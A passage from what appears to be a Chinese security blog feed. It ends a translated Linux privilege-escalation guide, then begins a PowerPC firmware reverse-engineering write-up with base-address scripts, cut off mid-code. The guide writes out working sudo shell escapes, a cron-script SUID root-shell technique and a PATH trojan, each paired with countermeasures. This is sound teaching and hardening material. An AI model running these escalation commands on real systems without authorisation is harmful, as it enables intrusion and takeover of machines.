<h3 id="4-利用_SUDO_权限/用户">4.利用 SUDO 权限/用户</h3><p>如果攻击者无法通过任何其他技术直接获得 root 访问权限，他可能会尝试危害任何具有 SUDO 访问权限的用户。一旦他可以访问任何 SUDO 用户，他基本上可以使用 root 权限执行任何命令。<br>一个典型的例子是为 find 命令分配 SUDO 权限，以便其他用户可以搜索系统中的特定文件/日志。虽然管理员可能不知道“find”命令包含用于命令执行的参数，但攻击者可以使用 root 权限执行命令。</p>
<p><strong>利用错误配置的 SUDO 权限获取 root 访问权限</strong></p>
<p><code>$ sudo -l – 打印允许我们作为 SUDO 运行的命令</code></p>
<div align="center"><br><img src="/img/20210820sudo-l.png" align><br></div>

<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">我们可以使用 SUDO 运行 <span class="keyword">find</span>、<span class="keyword">cat</span> 和 <span class="keyword">python</span>。当使用 SUDO 运行时，所有这些命令都将以 root 身份运行。</span><br><span class="line">如果我们可以通过这些命令中的任何一个以某种方式运行 <span class="keyword">shell</span>，我们就可以获得 root 访问权限。</span><br><span class="line">$ sudo <span class="keyword">find</span> /home -exec <span class="keyword">sh</span> -<span class="keyword">i</span> \; – <span class="keyword">find</span> 命令的 exec 参数可用于任意代码执行。</span><br></pre></td></tr></table></figure>
<div align="center"><br><img src="/img/20210820find_command_root.png" align><br></div>

<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; 永远不要给任何编程语言编译器、解释器和编辑器的 SUDO 权限。</span><br><span class="line">&gt; 这项准则也适用于 <span class="keyword">vi</span>、more、less、<span class="keyword">perl</span>、<span class="keyword">ruby</span>、gdb 等。</span><br><span class="line">$ sudo <span class="keyword">python</span> -<span class="keyword">c</span> <span class="string">'import pty;pty.spawn("/bin/bash");'</span> —— 启动一个<span class="keyword">shell</span></span><br></pre></td></tr></table></figure>
<p><strong>对策：</strong></p>
<ul>
<li>不要向任何可以切换为 shell 的程序授予 sudo 权限。</li>
<li>永远不要给 vi、more、less、nmap、perl、ruby、python、gdb 等类型程序 SUDO 权限。</li>
</ul>
<h2 id="5-_利用配置不当的_cron_任务">5. 利用配置不当的 cron 任务</h2><p>Cron 任务，如果配置不当，可以被利用来获得 root 权限。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> cron 任务中是否有任何可写的脚本或二进制文件？ </span><br><span class="line"><span class="number">2.</span> 我们能不能改写cron文件本身。 </span><br><span class="line"><span class="number">3.</span> cron.d 目录是否可写？</span><br></pre></td></tr></table></figure>
<p>Cron 任务通常以 root 权限运行。如果我们可以成功修改在 cron 任务中定义的任何脚本或二进制文件，那么我们就可以使用 root 权限执行任意代码。</p>
<p><code>$ ls -la /etc/cron.d – 打印已经存在于 cron.d 中的 cron 任务</code></p>
<div align="center"><br><img src="/img/20210820cron-1.png" align><br></div>

<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ find / -perm -2 -<span class="keyword">type</span> f 2&gt;/dev/null – 打印可写文件</span><br><span class="line">$ <span class="keyword">ls</span> -<span class="keyword">la</span> /usr/<span class="keyword">local</span>/sbin/cron-logrotate.<span class="keyword">sh</span> – 让我们确认 cron-logrotate.<span class="keyword">sh</span> 是否可写入。</span><br></pre></td></tr></table></figure>
<div align="center"><br><img src="/img/20210820logrotate_Cron_job_worl_writable.png" align><br></div>

<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; cron-lograte<span class="class">.sh</span> 是全局可写的，它由 logrotate cronjob 运行。我们在 cron-lograte<span class="class">.sh</span> 中写入/附加的任何命令都将以“root”身份执行。</span><br><span class="line">&gt; 我们在 /tmp 目录下写一个 C 文件并编译它。</span><br></pre></td></tr></table></figure>
<div align="center"><br><img src="/img/20210820rootme.c_cronjob.png" align><br></div>

<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; rootme 可执行文件将生成一个 <span class="keyword">shell</span>。</span><br><span class="line">$ <span class="keyword">ls</span> -<span class="keyword">la</span> rootme - 它告诉我们它归用户“SHayslett”所有</span><br></pre></td></tr></table></figure>
<div align="center"><br><img src="/img/20210820cron_job_.png" align><br></div>

<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ echo <span class="string">"chown root:root /tmp/rootme; chmod u+s /tmp/rootme;"</span>&gt;/usr/<span class="keyword">local</span>/sbin/cron-logrotate.<span class="keyword">sh</span> </span><br><span class="line">– 这将更改可执行文件的所有者和组为 root。它还将设置 SUID 位。</span><br><span class="line">$ <span class="keyword">ls</span> -<span class="keyword">la</span> rootme – 5 分钟后，logrotate cronjob 运行，cron-logrotate.<span class="keyword">sh</span> 以 root 权限执行。</span><br><span class="line">$ ./rootme – 产生一个 root <span class="keyword">shell</span>。</span><br></pre></td></tr></table></figure>
<div align="center"><br><img src="/img/20210820cronjobs_After5min.png" align><br></div>

<p><strong>对策：</strong></p>
<ul>
<li>cron 任务中定义的任何脚本或二进制文件都不应是可写的 </li>
<li>cron 文件不应被除 root 之外的任何人写入。 </li>
<li>cron.d 目录不应被除 root 之外的任何人写入。</li>
</ul>
<h3 id="6-_在PATH环境变量中使用’-’提权">6. 在PATH环境变量中使用’.’提权</h3><p>在您的 PATH 中包含“.”意味着用户能够从当前目录执行二进制文件/脚本。为了避免每次都输入这两个额外的字符，用户在他们的 PATH 中添加了“.”。这可能是攻击者提升其特权的绝佳方法。<br>假设 Susan 是管理员，她在路径中添加了“.”，这样她就不必再次写入这 2 个字符（./）。</p>
<p><strong>PATH中带有“.” - Program<br>PATH中没有“.” – ./program</strong></p>
<p>发生这种情况是因为在添加“.”后 Linux 首先在 PATH 开头搜索当前目录中的程序，然后搜索其他任何地方。</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="blockquote">&gt; 另一个用户“rashid”知道 susan 在她的路径中添加了“.”，因为她很懒</span></span><br><span class="line"><span class="blockquote">&gt; rashid告诉susan “ls”命令在他的目录中不起作用</span></span><br><span class="line"><span class="blockquote">&gt; Rashid 在他的目录中添加了一个代码，该代码将更改 sudoers 文件并使他成为管理员</span></span><br><span class="line"><span class="blockquote">&gt; Rashid 将该代码存储在名为“ls”的文件中并使其可执行</span></span><br><span class="line"><span class="blockquote">&gt; 苏珊拥有 root 权限。她来了，在拉希德的主目录中执行“ls”命令</span></span><br><span class="line"><span class="blockquote">&gt; 使用 root 访问权限执行恶意代码，而不是原始的“ls”命令</span></span><br><span class="line"><span class="blockquote">&gt; 在保存为“ls”的文件中，添加了将打印“Hello world”的代码</span></span><br></pre></td></tr></table></figure>
<div align="center"><br><img src="/img/20210820path_1.png" align><br></div>

<p><code>$ PATH=.:${PATH} – 在 PATH 变量中添加“.”</code></p>
<div align="center"><br><img src="/img/20210820path_2.png" align><br></div>

<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">ls</span> – 执行 ./<span class="keyword">ls</span> 文件而不是运行 <span class="keyword">list</span> 命令。</span><br><span class="line">&gt; 现在，如果 root 用户以 root 权限执行代码，我们可以实现以 root 权限执行任意代码。</span><br></pre></td></tr></table></figure>
<div align="center"><br><img src="/img/20210820path_3.png" align><br></div>

<p>在这里，我们总结了对任何基于 Linux 的系统的成功提权攻击。现在你知道攻击者如何利用某些技术来提升他们的权限，你可以进一步利用这些技术来保护您的系统和应用程序免受入侵和攻击。</p>
<p><em>原文链接：<a href="https://payatu.com/guide-linux-privilege-escalation" target="_blank" rel="external">https://payatu.com/guide-linux-privilege-escalation</a></em></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="0x0_介绍">0x0 介绍</h2><p>应用或者进程获取的权限应该按照最小权限原则赋予，只授予执行各自功能最小权限。授予不需要的权限可能回导致权限滥用，同时权限提升也是检测恶意代码的一个重要指标。</p>
<h2 id="0x01_什么是权限提升？">0x01 什么是权限提升？</h2><p>大多数计算机系统被设计为供多个用户使用。权限是指允许用户做什么。常见权限包括查看和编辑文件、修改系统文件等。权限提升是指用户获得他们无权获得的权限。这些权限可用于删除文件、查看隐私信息或安装恶意程序（如病毒）。它通常发生在系统存在允许绕过系统安全机制漏洞时，或者系统设计假设存在缺陷时。<br>权限提升是利用操作系统或软件应用程序中的错误、设计缺陷或配置疏忽来获得应用程序或用户保护的资源的更高访问权限的行为。结果是应用程序拥有比执行未经授权操作的开发人员或系统管理员预期更多的权限。<br>虽然根据统计大部分公司使用的更多的是 Windows 客户端程序，但在考虑到公司的网络安全时，Linux 特权升级攻击则是需要应对的更大的威胁。公司的关键基础设施，例如 Web 服务器、数据库、防火墙等，很可能运行在 Linux 操作系统。对这些关键基础设施的损害有可能严重破坏组织的运营。此外，物联网 (IoT) 和嵌入式系统在工作场所变得无处不在，从而增加了恶意黑客的潜在目标数量。鉴于 Linux 设备在工作场所的流行，公司应该加强和保护这些设备。</p>]]>
    
    </summary>
    
      <category term="Linux" scheme="http://www.youngroe.com/tags/Linux/"/>
    
      <category term="提权" scheme="http://www.youngroe.com/tags/%E6%8F%90%E6%9D%83/"/>
    
      <category term="Cybersecurity" scheme="http://www.youngroe.com/categories/Cybersecurity/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[一次嵌入式固件逆向实践]]></title>
    <link href="http://www.youngroe.com/2021/03/20/IOT/powerpc_binary_blob_firmware_reverse/"/>
    <id>http://www.youngroe.com/2021/03/20/IOT/powerpc_binary_blob_firmware_reverse/</id>
    <published>2021-03-20T11:39:22.000Z</published>
    <updated>2021-11-03T14:38:05.770Z</updated>
    <content type="html"><![CDATA[<h2 id="0x0_简介">0x0 简介</h2><p><strong>本文已被看雪智能设备版本设置为精华文章：<a href="https://bbs.pediy.com/thread-266803.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-266803.htm</a></strong><br>获取到一个设备的固件，有6M，基本没在网上找到对该固件进行分析的文章，因此决定按照固件分析的一般思路对该固件进行逆向分析，实践学习下。主要用到的工具binwalk、ida pro 7.5、ghidra。首先使用binwalk获取固件基础信息，首先看下能不能提取出文件来：</p>
<div align="center"><br><img src="/img/firmware_binwalk_e.png" align><br></div>

<a id="more"></a>
<p>失败，猜测可能是个单文件固件或者有没有可能是个加密的固件，但明文字符串信息分布比较均匀，应该不是加密固件，再使用-A选项看看固件中的字节码信息。</p>
<div align="center"><br><img src="/img/firmware_binwalk_a.png" align><br></div>

<p>很明确了，扫描出来全是PowerPC大端指令，包括函数开始prologue、结束epilogue相关的指令。</p>
<h2 id="0x01_确定加载基地址">0x01 确定加载基地址</h2><p>首先使用32位ida pro对firmware进行反汇编，不过需要首先设定处理器类型，选择PowerPC big-endian。</p>
<div align="center"><br><img src="/img/firmware_ida_set.png" align><br></div>

<p>然后一路点确定，很遗憾ida pro没有自动分析，没有一个函数被识别出来，试试binwalk扫描出的函数prologue地址0x2004，跳转到这个地址按C键反汇编，可以自动识别关联的一些函数，查看字符串窗口也无法查看到对字符串的引用，猜测可能有两个原因：</p>
<ul>
<li>ida pro现在识别出的函数太少，很多函数还未识别出来，导致无引用</li>
<li>加载基地址不正确，导致引用地址错误，无法形成交叉引用<br>识别出来的函数太少，可以写一个脚本根据函数序言特征识别出函数头，再自动分析函数，特征码为94 21 FF ?? 7C 08 02 A6，binwalk中的识别码为0x7C0802A6（mflr r0），而ghidra可以直接自动分析。</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ROM:<span class="number">000020</span>EC <span class="number">94</span> <span class="number">21</span> FF F8                             stwu      r1, back_chain(r1)       <span class="comment">//开辟栈空间</span></span><br><span class="line">ROM:<span class="number">000020F</span>0 <span class="number">7</span>C <span class="number">08</span> <span class="number">02</span> A6                             mflr      r0                       <span class="comment">//</span></span><br></pre></td></tr></table></figure>
<div align="center"><br><img src="/img/firmware_ghirda.png" align><br></div>

<p>ghirda总共识别出来26000多个函数，应该识别出来差不多了，但是字符串仍然无法形成引用，要不然就是不正确，必须要解决基地址问题。</p>
<h3 id="方法一-通过跳转表特征确定基地址">方法一.通过跳转表特征确定基地址</h3><p>搜索powerpc固件加载基地址可以获取到一些信息，<a href="https://github.com/ilovepp/ppc_rebase" target="_blank" rel="external">ppc_rebase</a>运行可以得到一个基地址，但验证后发现不正确。通过参考其他资料，目前主要有四种固件基地址识别方法，具体参考<a href="http://gb.oversea.cnki.net/KCMS/detail/detail.aspx?filename=1018812112.nh&amp;dbcode=CDFD&amp;dbname=CDFDREF" target="_blank" rel="external">ARM设备固件装载基址定位的研究_朱瑞瑾</a>，然后通过学习PowerPC相关指令集<a href="https://bbs.pediy.com/thread-191928.htm" target="_blank" rel="external">PowerPC下C逆向指南</a>，发现PowerPC switch语句汇编实现中存在一个跳转表，通过跳转表及函数语句地址之间的关系可以计算出PowerPC固件基地址，具体参考脚本。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="string">'''</span><br><span class="line">get powerpc big endin base addr by switch case jmp_table</span><br><span class="line">ROM:0000FAF4 28 03 00 07                             cmplwi    r3, 7</span><br><span class="line">ROM:0000FAF8 54 63 10 3A                             slwi      r3, r3, 2</span><br><span class="line">ROM:0000FAFC 3D 83 00 07                             addis     r12, r3, 7</span><br><span class="line">ROM:0000FB00 41 81 01 D0                             bgt       loc_FCD0</span><br><span class="line">ROM:0000FB04 81 6C FB 10                             lwz       r11, -0x4F0(r12)</span><br><span class="line">ROM:0000FB08 7D 69 03 A6                             mtctr     r11</span><br><span class="line">ROM:0000FB0C 4E 80 04 20                             bctr</span><br><span class="line">ROM:0000FB0C                         # ---------------------------------------------------------------------------</span><br><span class="line">ROM:0000FB10 00 06 FB 30                             .long unk_6FB30</span><br><span class="line">ROM:0000FB14 00 06 FB 54                             .long unk_6FB54</span><br><span class="line">ROM:0000FB18 00 06 FB 70                             .long unk_6FB70</span><br><span class="line">ROM:0000FB1C 00 06 FB A8                             .long unk_6FBA8</span><br><span class="line">ROM:0000FB20 00 06 FB C4                             .long unk_6FBC4</span><br><span class="line">ROM:0000FB24 00 06 FC 18                             .long unk_6FC18</span><br><span class="line">ROM:0000FB28 00 06 FC 34                             .long unk_6FC34</span><br><span class="line">ROM:0000FB2C 00 06 FC B8                             .long unk_6FCB8</span><br><span class="line">ROM:0000FB30                         # ---------------------------------------------------------------------------</span><br><span class="line">ROM:0000FB30 80 7F 01 68                             lwz       r3, 0x168(r31)</span><br><span class="line">ROM:0000FB34 48 01 D3 85                             bl        sub_2CEB8</span><br><span class="line">ROM:0000FB38 38 83 00 00                             addi      r4, r3, 0</span><br><span class="line">ROM:0000FB3C 38 7F 00 00                             addi      r3, r31, 0</span><br><span class="line"></span><br><span class="line">ida pro crtl+B  "7D ?? 03 A6 4E 80 04 20"  匹配查找到类似代码</span><br><span class="line">方法1：</span><br><span class="line">bctr 根据ctr寄存器值跳转</span><br><span class="line">mtctr r11 表示将r11的值加载到ctr寄存器</span><br><span class="line">r11 = 0x70000+r3*4-0x4F0，可以计算得到 当r3为0时，r11为0x6FB10 则ctr寄存器值也为0x6FB10</span><br><span class="line">则第一个跳转地址表实际所在的地址应该为0x6FB10，  0x6FB10 = base_addr + file_offset(0xFB10)</span><br><span class="line">可以计算base_addr = 0x6FB10 - 0xFB10</span><br><span class="line"></span><br><span class="line">方法2：</span><br><span class="line">最后一个跳转地址后面应该是第一个case语句跳转地址，这里的文件偏移为0xFB30</span><br><span class="line">在跳转地址表中找到最小的一个地址，这里为0x6FB30</span><br><span class="line">实际这两个地址应该相等，则 base_addr =  0x6FB30 - 0xFB30</span><br><span class="line"></span><br><span class="line">脚本实现的方法2，但是在某些固件中跳转地址表中的跳转地址不是绝对地址而是相对地址，脚本就无法通过方法二计算</span><br><span class="line">需要手动根据方法1计算</span><br><span class="line">'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_ppc_base_by_switch_table</span><span class="params">(image_data, start_addr, max_gap=<span class="number">1</span>&lt;&lt;<span class="number">16</span>)</span>:</span></span><br><span class="line">    <span class="string">'''</span><br><span class="line">    通过跳转表首地址获取跳转地址表、第一个case语句地址</span><br><span class="line">    跳转地址表中的地址应该是紧凑的，有一个地址范围差max_gap，通过该条件可以获取到所有跳转地址</span><br><span class="line">    与最后一个跳转地址相邻的是第一个case语句的地址，如果基地址正确则该地址应该和跳转地址表中最小的地址相等</span><br><span class="line">    这里设置的基地址为0，则这两个地址之间的差值即为基地址</span><br><span class="line">    '''</span></span><br><span class="line">    offset = start_addr</span><br><span class="line">    gap = <span class="number">0</span></span><br><span class="line">    jmp_table_addr = struct.unpack_from(<span class="string">"&gt;i"</span>, image_data, offset)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> jmp_table_addr == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    jmp_table_addrs = []</span><br><span class="line">    <span class="keyword">while</span> gap &lt; max_gap:</span><br><span class="line">        jmp_table_addrs.append(jmp_table_addr)</span><br><span class="line">        offset = offset + <span class="number">4</span></span><br><span class="line">        addr = struct.unpack_from(<span class="string">"&gt;i"</span>, image_data, offset)[<span class="number">0</span>]</span><br><span class="line">        gap = abs(addr - jmp_table_addr)</span><br><span class="line">        jmp_table_addr = addr</span><br><span class="line">    jmp_table_addrs.sort()</span><br><span class="line">    file_loc1_addr = offset</span><br><span class="line">    true_loc1_addr = jmp_table_addrs[<span class="number">0</span>]</span><br><span class="line">    ppc_base = true_loc1_addr - file_loc1_addr</span><br><span class="line">    <span class="keyword">return</span> ppc_base</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_switch_code_addrs</span><span class="params">(image_data)</span>:</span></span><br><span class="line">    <span class="string">'''</span><br><span class="line">    #ida 7D ?? 03 A6 4E 80 04 20</span><br><span class="line">    7D ?? 03 A6                             mtctr     rS          </span><br><span class="line">    4E 80 04 20                             bctr </span><br><span class="line">    通过switch语句字节码匹配查找固件中switch case跳转表首地址               </span><br><span class="line">    '''</span></span><br><span class="line">    re_switch_opcode = <span class="string">b"\x7d.&#123;1&#125;\x03\xA6\x4E\x80\x04\x20"</span>  </span><br><span class="line">    bytes_data = bytearray(image_data)</span><br><span class="line">    re_pattern = re.compile(re_switch_opcode)</span><br><span class="line">    addrs = []</span><br><span class="line">    <span class="keyword">for</span> match_obj <span class="keyword">in</span> re_pattern.finditer(bytes_data):</span><br><span class="line">        addrs.append(match_obj.start()+<span class="number">8</span>)                  <span class="comment">#7D ?? 03 A6 4E 80 04 20  len = 8</span></span><br><span class="line">    <span class="keyword">return</span> addrs</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ppc_base_count</span><span class="params">(ppc_bases)</span>:</span></span><br><span class="line">    freq_dict = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> ppc_base <span class="keyword">in</span> ppc_bases:</span><br><span class="line">        freq_dict[ppc_base] = freq_dict.get(ppc_base, <span class="number">0</span>) +<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> freq_dict</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_success</span><span class="params">(ppc_bases)</span>:</span></span><br><span class="line">    ppc_base_freq = ppc_base_count(ppc_bases)</span><br><span class="line">    ppc_base_freq = sorted(ppc_base_freq.items(), key = <span class="keyword">lambda</span> kv:(kv[<span class="number">0</span>], kv[<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">for</span> base <span class="keyword">in</span> ppc_base_freq:</span><br><span class="line">        print(<span class="string">'%#x:%d'</span>%(base[<span class="number">0</span>], base[<span class="number">1</span>]))</span><br><span class="line">    print(<span class="string">"The rebase address is:%#x"</span>%ppc_base_freq[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_ppc_rebase</span><span class="params">(firmware_path)</span>:</span></span><br><span class="line">    f = open(firmware_path, <span class="string">"rb"</span>)</span><br><span class="line">    image_data = f.read()</span><br><span class="line">    f.close()</span><br><span class="line">    addrs = get_switch_code_addrs(image_data)</span><br><span class="line">    <span class="keyword">if</span> len(addrs) == <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">"[-] error find switch table addrs"</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    ppc_bases = []</span><br><span class="line">    <span class="keyword">for</span> addr <span class="keyword">in</span> addrs:</span><br><span class="line">        ppc_base = get_ppc_base_by_switch_table(image_data, addr)</span><br><span class="line">        <span class="keyword">if</span> ppc_base &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        ppc_bases.append(ppc_base)</span><br><span class="line">    <span class="keyword">if</span> len(ppc_bases) &gt; <span class="number">0</span>:</span><br><span class="line">        print(firmware_path + <span class="string">" firmware base addr:\n"</span>)</span><br><span class="line">        print_success(ppc_bases)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"find rebase address failed, you can see the fllow addr use ida pro:"</span>)</span><br><span class="line">        <span class="keyword">for</span> inx, val <span class="keyword">in</span> enumerate(addrs):</span><br><span class="line">            <span class="keyword">if</span> inx &gt; <span class="number">5</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            print(<span class="string">"%#x"</span>%(val-<span class="number">16</span>))</span><br><span class="line">        print(<span class="string">"press key C, find addi ra,rb, eg:addi r9, r11, 0x71A4 # 0x271A4"</span>)</span><br><span class="line">        print(<span class="string">"base = \"0x271A4\" - %#x"</span> %addrs[<span class="number">0</span>])</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"ppc_rebase.py firmware_path"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        usage()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        firmware_path = sys.argv[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(firmware_path):</span><br><span class="line">            usage()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            find_ppc_rebase(firmware_path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<div align="center"><br><img src="/img/firmware_rebase_jmptable.png" align><br></div><br>关键是通过7D ?? 03 A6 4E 80 04 20特征码获取switch语句地址，然后根据地址关系可以计算出固件基地址为0x60000，设置基地址后字符串可以正常引用<br><br><div align="center"><br><img src="/img/firmware_ghirda_xerf.png" align><br></div>

<h3 id="方法二-通过字符串引用次数暴力搜索确定基地址">方法二.通过字符串引用次数暴力搜索确定基地址</h3><p>大概原理是首先获取固件中的字符串地址，然后通过设置不同的基地址测试该基地址下字符串的引用次数，引用次数越高说明该地址为基地址的概率越大，有一定的通用性，在readme中说对查找ARM固件效果比较好，我测试了两个PowePC固件都能正确获取到基地址，不过需要设置好参数，特别是大小端、字符串长度范围。由于是暴力搜索计算出来的所以比较费CPU，计算一次至少半小时起步，项目地址：<a href="https://github.com/sgayou/rbasefind" target="_blank" rel="external">https://github.com/sgayou/rbasefind</a></p>
<div align="center"><br><img src="/img/firmware_rebase_str_xerf.png" align><br></div>

<h2 id="0x02_IDA_Pro反编译函数">0x02 IDA Pro反编译函数</h2><p>设置正确的基地址后，ghirda基本可以正常进行静态反汇编分析了，也有伪代码功能，但是用得不熟悉、插件貌似也很少，还是习惯ida pro，但是ida不能自动反汇编，必须手动make code，下面通过两种方法使ida反编译函数。</p>
<h3 id="方法一-借用ghirda反汇编结果">方法一.借用ghirda反汇编结果</h3><p>可以将ghirda反汇编得函数地址信息导出，然后使用脚本导入到ida中make code。<br>ghirda中导出函数列表方法：Window-&gt;Functions 在Functions窗口右键Export-&gt;Export to CSV保存。<br>ida中导入ghirda函数脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">import</span> ida_funcs</span><br><span class="line"><span class="keyword">import</span> ida_kernwin</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span><br><span class="line">ida pro 7.5  python3</span><br><span class="line">'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_funcs_addr</span><span class="params">(csv_path)</span>:</span></span><br><span class="line">    starts = []</span><br><span class="line">    <span class="keyword">with</span> open(csv_path, <span class="string">'r'</span>) <span class="keyword">as</span> file:</span><br><span class="line">        reader = 